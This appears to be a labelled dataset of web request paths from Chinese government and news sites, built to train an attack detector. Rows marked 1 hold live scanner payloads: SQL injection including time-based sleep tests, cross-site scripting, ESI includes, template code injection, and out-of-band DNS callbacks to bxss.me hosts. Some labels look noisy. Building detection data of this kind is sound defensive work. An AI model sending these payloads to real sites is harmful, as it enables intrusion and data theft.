request	label
"/****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/******/system/2021/11/15/javascript:void();	1
"/************/categorysearch.do?cateid=1&p=1&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl="""".gethostbyname(lc(""""hitwz"""".""""blvovtqg2f80b.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(122).chr(83).chr(122).chr(75).""""&websiteid=110105008056111"	1
/****/1012/2234.htm	0
/zwxx_11337/****/201903/t20190306_1299839.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u8d1d\u8d1d\u4e50\u7ae5\u88c5\u5e97	0
/****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52001228177&token=&url=a&{/dede:field}=	1
/****/202104/t20210416_272633.html	0
/**********/system/2021/11/23/013484004.shtml	0
/***/003/002/987/00300298781_fc062f3a.png	0
/******/_content/download.jsp?urltype=news.downloadattachurl%' and 6452=6452	1
/****/czgk/bmjs/rmtt/cl/index_1.html	0
/***/interface/comul_total.json.jsp?callback=jquery19106831379085231857_1640025758382	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=2133&h=1200&treeid=1144&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2djc2ovz2nzajeuahrt&pagename=l2djewpfbglzdc5qc3a=&newsid=-1	0
/**********/system/2014/11/14/011555706.shtml	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\u06be\ufffd\ufffd\u0732\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u04f1\ufffd	0
/******/457/jquery.superslide.2.http://bxss.me/t/fit.txt?.jpg.js	1
/****/yqzt/jtddt/	0
/****/gjzqq/bmz/gb/201412/w020141211592570329365.jpg	0
/**/system/2021/03/26/012145721.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5de5\u5546\u8d38\u6613\u5927\u4f17\u5546\u884c\u7b2c\u4e09\u7ecf\u9500\u90e8	0
/**********/system/2020/04/12/013137956.shtml	0
/****/zxft/index_6.html	0
/*******/countdoc?siteid=115&docid=3207578	0
/****/rdhy%' and 2*3*8=6*8 and '5y5x'!='5y5x%/1.htm	1
/****/api/****/getdtectauthurl?redirecturl=https:/www.zsebank.com/****/bank-userinforauthenticationphone.jsp&lxsj=15819984633&tjr=t013429	0
/****/ysqgk/zzqzfzsjgzssydw/index_1.html	0
/**********/system/2020/07/05/013198986.shtml	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u9f0e\u4fe1\u4e94\u91d1\u6807\u51c6\u4ef6\u7ecf\u9500\u90e8	0
"/****/zzxxgk/tjj/zfxxgkml_2127'""""()&%<acx><script >covi(9133)</script>/jytabljg_2061/list.html"	1
/wp-content/******/bensure/404.php	1
"/*********/index/login/index.html?fromurl=st4r7s<d3v	onmouseover = confirm()
x//qqqxss3nd&username=8"	1
/****/20201016/e108499638.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8001\u9a6c\u70e4\u998d\u5e97	0
/****/bmkx/styj/201907/w020190711633098534372.jpg	0
/zwxx_11337/****/201903/t20190321_1324746.html	0
/****/gfxwj/list_7.html	0
/**********/system/2021/12/15/javascript:window.print()	1
/***/blockdata/getsearchinfo.do?&title=\u589e\u957f\u4e86	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u8bda\u946b\u8bda\u4ebf\u88c5\u9970\u6750\u6599\u6709\u9650\u516c\u53f8	0
/zwxx_11337/****/201906/t20190618_1556248.html	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqwsb/202002/t20200210_1949127.html	0
/****/2020wzqh/wzqh_zyjs/index_1.html	0
/**********/system/2020/11/29/javascript:void();	1
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/index_1.html	0
/****/js/encrypt/jbase64' and 2*3*8=6*8 and 'bvcl'='bvcl.js	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u6da6\u6cfd\u6c34\u6ce5\u7ecf\u9500\u90e8	0
/******/business-area/quotation-service/2017-03-0'xor(if(now()=sysdate(),sleep(3),0))xor'z/687.html	1
/*****/system/2021/12/16/013495548.shtml	0
/******/public/2021/12/01/110948.images/v110948_b1638320005887_app.jpg	0
/******/xsd/	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6e20\u53e3\u4e61\u9f99\u817e\u901a\u8baf\u90e8	0
"/******/web/jpage/theme'""""()&%<acx><script >9x6a(9174)</script>/simple/css/jpage.css"	1
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1' and 5601=8700 and '1'='1	1
/zwgk' and 2*3*8=6*8 and '2pcw'='2pcw/*******/fdzdgknr/ghxx.htm	1
/******/	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u5934\u8425\u9547\u5927\u7599\u7629\u6751\u6210\u82b1\u6cb9\u574a	0
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p="""".gethostbyname(lc(""""hitsw"""".""""ycxckzia3c943.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(108).chr(89).chr(97).chr(74).""""&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/shzr/zrbg/201411/p020210117703367059790.pdf	0
/**********/system/2020/12/02/javascript:void();	1
/zwxx_11337/****/202111/t20211112_3125641.html	0
/******/system/2011/03/03/010299570.shtml	0
/******/2017hhs/js/jquery.kinslideshow-1.2.1.min.js	0
/****/czgk/bmjs/sydw1/zzqmtdzj/index_1.html	0
"/**/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/******/public/2021/12/09/111266.images/v111266_b1639012603736_app.jpg	0
/*****/gy42/cpgyss.asp?key=\u6c34\u5229\u5de5\u7a0b\u542f\u95ed\ufffd?&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/***/viewspace-638.html	0
/****/gjgk/gjjj/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/system/2021/01/15/013320259.shtml	0
/**********/system/2021/10/02/013459897.shtml	0
/**********/system/2021/11/23/013484400.shtml	0
/****/2021/05/70243.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u70ab\u9b45\u7a7a\u95f4\u62a4\u80a4\u54c1\u5e97	0
/****/businesses-e35471_14.html?category_id	0
/**/system/2021/12/21/012232179.shtml	0
"/************/template/jcse'""""()&%<acx><script >67jp(9565)</script>/110105008056111/16/images/ui.css"	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3377)</script>?_=1630311830009"	1
/******/qhkm/img3/1.png	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzfhcxjst/202108/t20210818_2980516.html	0
/***/0/01/83/85/1838509_280613.jpg	0
/****/bmkx/sjhj/202104/t20210430_181289_wap.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u56db\u5b63\u9c9c\u852c\u83dc\u6c34\u679c\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5bcc\u5f3a\u9ec4\u725b\u517b\u6b96	0
/****/xxgkml/hygq_3720/rdhy/202002/t20200224_148187.html	0
/****/web/search?page=24&channelid=222832&searchword=\u59dc\u5fd7\u521a&keyword=\u59dc\u5fd7\u521a&perpage=20&outlinepage=10	0
/****/20200629/e102884597.html	0
/*****/gy48/cpgyss.asp?key=\u624b\u8f6e\u542f\u95ed\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/jishi/?undefined=undefined	0
/****/wyd/ldyl/	0
/****/201909/t20190926_1757239.html	0
/****/zgsdt/zgs17_6389/201711/t20171120_179572.html	0
/**/index.php?do=post&id=289&c=dt&a=goods&	1
/**/index.php?vyhl='>alert(777)&lang=cze	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u53cc\u6e20\u5fe0\u7965\u9910\u5385	0
/******/cms/	1
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/bxss.me.html	1
"/******/main/messages/outbox.php?f=social"""" onmouseover=""""confirm(777)"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7ea2\u6dfc\u98df\u54c1\u6dfb\u52a0\u5242\u7ecf\u9500\u5e97	0
/******/public/2021/12/20/20211220_17dd5bfb67f_r1_1200k.mp4	0
/******/resource/interview/room.jsp?wbinterviewid=1033%') or 0935=0935	1
/zwxx_11337/****/201909/t20190916_1740540.html	0
/**********/system/2016/09/05/012119906.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5468\u5149\u670d\u88c5\u644a	0
/zwxx_11337/****/201707/t20170727_298802.html	0
/****/zgsdt/2018_zgsdt/201808/t20180829_191940.html	0
/**************/newscenter/system/2021/12/20/013497321.shtml	0
/**********/system/2021/12/01/javascript:void();	1
/**/system/2021/01/17/012116134.shtml	0
/***/interface/url_total_pv.json.jsp?callback=jquery19106661561641438858_1639972870427	0
/**********/system/2021/10/27/013471006.shtml	0
/*****/b-e2086948.html	0
/****/zfwjn//xfs.bxss.me/1104/list.html	1
/zwxx_11337/***/201710/t20171016_518078.html	0
"/****/czgk/bmjs/sydw1/zzqlswzcb/zzqlsj/\""javascript:void(0)\"""	1
/****/b-e1008670.html	0
/******/ind_business_libg.jpg	0
/****/jcms/interface/jtree.jsp?type=2&webid=1&password=*&userid=admin' and '1'='1	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5218\u6885\u82f1\u8d27\u8fd0\u90e8	0
/*******/qiye/b-e1420310.html	0
/*********/appimage/close.png	0
/****/bmkx/jtysj/202105/w020210526396634072532.png	0
/****/xxgkml/yjyayjxx/202107/t20210723_184902.html	0
/zwxx_11337/****/202102/t20210218_2599741.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1073)"">?_=1630311731384"	1
/**********/system/2021/05/11/013383362.shtml	0
/****/20211208/javascript:void(0);	1
"/****/czgk/bmjs/sydw1/zzqlycyjj/zzqlyt/\""javascript:void(0)\"""	1
"/************/risk-disclosure/2017-03-16/0""""xor(if(now()=sysdate(),sleep(3),0))xor""""z.html"	1
/**********/system/2021/05/27/013392101.shtml	1
/xwdt%' and 2*3*8=6*8 and 'unu2'!='unu2%/****/jhcw/gzdt.htm	1
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ycs/lws/xmb_gzdxb.htm	1
/****/201909/t20190926_1757453.html	0
/**/system/2020/05/25/011995116.shtml	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/********/jcse/110105008056111/16/images/css.js"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5b89\u66fc\u5bbe\u9986	0
/****/whs/yw_1286/202106/t20210618_2890748.html	0
/**/system/2021/12/11/012229361.shtml	0
/**/system/2021/03/22/javascript:void(0);	1
"/***********/jinrongqihuo/0""""xor(if(now()=sysdate(),sleep(28),0))xor""""z/"	1
/********/static/js/1.686d4dce75bce2359d0b.js	0
"/****/system/2021/09/08/013447520.shtml/""""><script>alert(164)</script>"	1
/**********/system/2021/11/21/013483246.shtml	0
/**********/system/2021/10/07/013460917.shtml	0
/*******/202103/202103241805401176.html	0
/****************/images/common/default/img-bottom-arc.png	0
/***/jt/jzxy/images/j03.jpg	0
/**/ui/lib/bxss.me/themes/bootstrap/messager.css	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtf67n1a0fhvdpub8pzyasuu=&openid=ovl7jjor73twuh-ma_pkjmx-wva8&outer_str=29226&activate_ticket=fdzv9emqaffrnr3xboqhb6jkxk8s7vbjwfot3v6yv8joo8dbj5 fzedtzplsmcardqc7in/s/mcolc3wz9ny8izzmnd3anajhzoe0ku4ew8=	0
/*****/gygj/ssgs/lxwm/gjcp/ddjs/qtgz/lxwm/kjcx/qyzz/qywh/shzr/	0
/**********/system/2021/09/25/javascript:void(0);	1
/***/003/004/426/00300442669_1610dabf.jpg	0
/*****/gy42/cpgyss.asp?key=\u02af\ufffd\u037b\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3f6d	0
/**********/system/2020/04/10/013136685.shtml	0
/*******/qiye/businesses-e49898.html?category_id=219732	0
/***/0/02/03/92/2039271_929882.jpg	0
/**/mediacenter/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/blockdata/getsearchinfo.do?&title=\u5883	0
/****/bmkx/sfgw/201610/t20161025_14210.html	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""1263698""}"	0
/******/hdqth/images/logo.gif	0
/****/bygk/shsy/201907/w020190729350858956340.jpg	0
/***/col40/index.html	0
/****/bxss.me/t/xss.html?	1
/****/yqzt/qyddt/202005/t20200527_247879.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5f00\u62d3\u7535\u8111\u79d1\u6280\u90e8	0
/****/dqgz/201810/t20181010_193707.html	0
/****/gjdjbn/djbn_zyjh/	0
/*****/system/2014/07/28/011466216.shtml	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u02bd\ufffd\ufffd\u027b\ufffd&l=\ufffd\ufffd\ufffd	0
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/******//xfs.bxss.me/rest.css	1
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/202002/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/****/20210521/9880.html	0
/***/getdynamic?vno=3.5.0&	1
"/**/ui<esi:include src=""""http://bxss.me/rpb.png""""/>/lib/easyui/themes/bootstrap/linkbutton.css"	1
/****/gjdjbn/djbn_sjhd/	1
/zwxx_11337/****/202005/t20200522_2096452.html	0
/************/template/jcse/bxss.me/16/images/result.css	1
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/****/zdlygk/ncwywfgz/wzs/hsbq%' and 2*3*8=6*8 and 'a6mt'!='a6mt%/xmb_gzdxb.htm	1
/***/web/sa3/addholiday.do	1
/*****/system/2019/08/19/javascript:window.print()	1
/*******/qiye/b-e2450397.html	0
/***/003/003/109/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/qwsearch/?searchword=\u7ec4\u7ec7\u90e8	0
/*******/9kaw7lh4.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u4f73\u5bb6\u9999\u9910\u9986	0
/****/zt/jczwgk/hlx/201808/t20180831_1027553.html	0
/****/20161109/2213.html	0
/****/state/service/166/exec	1
/**********/system/more/233000000000000/0011/233000000000000_00001135.shtml	0
/****/zdlygk/bzxajgc/gys'||'.htm	1
/***/0/02/10/16/2101694_997597.png	0
/**********/system/2020/03/23/javascript:window.print()	1
/*****/gy48/cpgyss.asp?key=\u516c\u660e\u4e50\u6cf0\u80f6\u6c34\u516c\u53f8&l=\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u6d69\u8fd0\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqskylgbjdaj_1820/201702/t20170208_318647.html	0
/****/cyryhmd.htm	1
/**********/system/2021/12/20/013497342.shtml	0
/****/system/2021/12/15/javascript:window.print()	1
/zwxx_11337/****/202003/t20200331_2006857.html/index_1.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/jgzn'""""()&%<acx><script >uocq(9606)</script>_2042/list.html"	1
/zwxx_11337/****/202110/t20211009_3075692.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033' or 6005=6005 and '1'='1&owner=1707212448	1
/art'||'/****/10/12/art_33_242440.html	1
/**********/system/2021/12/16/013495506.shtml	0
/*******/qiye/b-e1931289.html	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u6bd4\u997a\u7f8e\u9984\u9968\u5e97	0
/****/2021/05/72149.html	0
/****/2020_xsrw	0
/****/bmkx/sgaj/201805/w020180509379285479253.jpg	0
/****/qzfwj/202110/t20211026_3105092.html	0
/***/2018/12/6/art_37_13706.html	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqlshwzcbj/zzqlsj/201712/t20171211_633245.html	0
/xxgk%' and 2*3*8=6*8 and '7pqf'!='7pqf%/*****/1088/1104/list.html	1
/****/20200707/e103217058.html	0
/******/system/2011/09/29/010483078.shtml	0
/***/2018/8/13/art_31_16946.html	0
/***/0/00/32/96/329603_944461.jpg	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d77\u660e\u7267\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**/ui/widgets/scrollup/css/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/image.css	1
/******/system/2017/10/24/javascript:void();	1
/****/gzdt/	0
/****/qzfwj/202103/t20210323_2635015.html	0
/*****/javascript:stranbody();	1
/zwxx_11337/****/zcjd/201901/t20190108_1245055_zzb.html	0
/**/ui//xfs.bxss.me/easyui/plugins/jquery.linkbutton.js	1
/******/zzq2020jgnb2.png	0
/****/zxm/spbd/	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(789)</script>?_=1630311569425"	1
/******/logo_newspage.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7f8a\u7f8a\u76ae\u8349\u884c	0
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
"/****/' 'a'.concat(70-3).concat(22*4).concat(97).concat(79).concat(108).concat(83) (require'socket'
socket.gethostbyname('hitoe' 'jnvozjif5ef5c.bxss.me.')[3].to_s) '/fdzdgknr/qtfdxx/"	1
/**********/system/2021/09/01/013443129.shtml	0
"/****/xxgkzd/list.html?new=0.8636762614591329&wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/***/003/003/721/00300372183_089bf0a0.jpg	0
/****/ssgs/kmbg/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/qzfwj/201912/t20191216_1887278.html	0
/****/lj_46507/yw_1295/202106/t20210622_2894620.html	0
/***/0/02/12/39/2123948_443153.jpg	0
/****/data/index.php	1
/****/cache/mjx1.php	1
/***/0/00/58/76/587656_623955.jpg	0
/******/web/jpage/theme/default/css'||'/jpage.css	1
/***/0/01/80/10/1801096_489350.jpg	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_articleid=239572&i_columnid=37' and 'x'='y	1
/****/system/2020/12/23/013308273.shtml	0
"/****/abantecart/index.php?currency=""><script>alert(777);</script>&product_id=109""><script>alert(777);</script>&rt=product/product"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4ec1\u4e45\u4fe1\u5546\u52a1\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8	0
/****/system/2017/09/08/012410099.shtml	0
"/************/template/jcse/110105008056111/16/images/plugin/category/js.js/<img src=""javascript:alert(4663)"">"	1
/**********/system/2021/10/20/013467215.shtml	0
/******/system/2019/06/26/012913927.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtck1aorprzmy5a5wnmvzkj8=&openid=ovl7jjnn8ftxgnbkvx9li-5rtnfe&outer_str=40906&activate_ticket=fdzv9emqaffrnr3xboqhb9egptbidbkqqtifghqchp5hfifidrt1ejnprxbtx1zvspxifldvolt7oe9t1yvnztlcwsrfarwr51a1di8kfzu=	0
/**********/system/2021/10/01/013459647.shtml	0
/**********/system/2020/06/07/013179644.shtml	0
/*/170822-1/index/http://bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u9a6c\u552f\u79d1\u8d27\u7269\u8fd0\u8f93\u90e8	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u5e7c\u6258\u66b4\u529b	0
/zwxx_11337/***/201612/w020170727690813825858.jpg	0
/****/pwbag4-hynews-e110664332.html	0
/***/0/01/27/62/1276266_964391.jpg	0
"/****/index.cfm?error.diagnostics="""">alert(777)"	1
/****/xqdt/jyx/202111/t20211126_197009.html	0
/************/http://bxss.me/t/fit.txt/jcse/110105008056111/16/images/ui.css	1
"/*****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
/**********/system/2021/09/14/013451019.shtml	0
/**********/system/2020/03/20/013120444.shtml	0
/****/system/2020/07/03/013198427.shtml	0
/****/wdsjs/hfswsj/202112/t20211202_197229_wap.html	0
/****/yfc	0
/****/bmkx/sgxw/201907/t20190709_139462.html	0
/*******/5/top-footer.css	1
/****/qzfwj/201801/t20180115_669661.html/index_1.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u65b0\u533a\u660e\u4fe1\u996d\u5e84	0
/**********/system/2021/12/21/013497436.shtml	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/201907/t20190702_161653.html	0
/**********/system/2021/08/21/013437970.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') or 8151=8151 --	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7fd4\u9f99\u529e\u516c\u5bb6\u5177\u7ecf\u9500\u90e8	0
/****/byyw/202103/t20210319_178731_wap.html	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime and 6861=1645--&perpage=15&outlinepage=10	1
/****/system/2012/02/11/010638951.shtml	0
/****/zfgb/2019/201908/p020190808595376876206.pdf	0
/****/zdlygk/ncwywfgz/zws/yzq/xmb_gzdxb%' and 2*3*8=6*8 and 'jgqm'!='jgqm%.htm	1
"/****/web/js/jquery-1.7.2.min.js/*/-->'""""></iframe></script></style></title></textarea><script >alert(55175)</script>"	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') or 6625=2253	1
/****/bmkx/sfgw/201907/t20190704_139274.html	0
